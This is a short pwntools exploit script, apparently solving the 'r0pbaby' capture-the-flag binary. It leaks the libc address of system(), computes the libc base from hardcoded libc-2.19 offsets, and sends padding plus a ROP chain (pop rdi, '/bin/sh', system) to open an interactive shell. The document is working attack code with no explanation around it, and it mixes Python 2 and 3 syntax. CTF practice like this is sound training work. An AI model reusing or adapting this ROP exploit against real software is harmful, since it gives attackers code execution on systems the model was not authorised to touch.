from pwn import *

context(arch='amd64', os='linux')

def get_addr(tn, name):
    tn.send(b'2\n' + name.encode() + b'\n')
    tn.recvuntil(name.encode() + b': ')
    buf = tn.recvuntil(b'\n')
    addr = int(buf.decode(), 16)
    print(name + ' :{0}'.format(hex(addr)))
    return  addr

proc = process('./r0pbaby')

#gadget offsets (/lib/x86_64-linux-gnu/libc-2.19.so)
g_poprdi = 0x22b1a
g_binsh = 0x0017ccdb
g_system = 0x00046640 

time.sleep(1)
print proc.recv(1024)

system_addr = get_addr(proc, 'system')
print "system addr is %x" % system_addr
libc_addr = system_addr - g_system

proc.recv(1024)
proc.send('3\n')
time.sleep(1)

payload = "A"*8
payload += flat(
		(libc_addr + g_poprdi),
		(libc_addr + g_binsh),
		system_addr
	)

proc.send(str(len(payload)) + "\n")
proc.send(payload + "\n")

time.sleep(1)
proc.interactive()

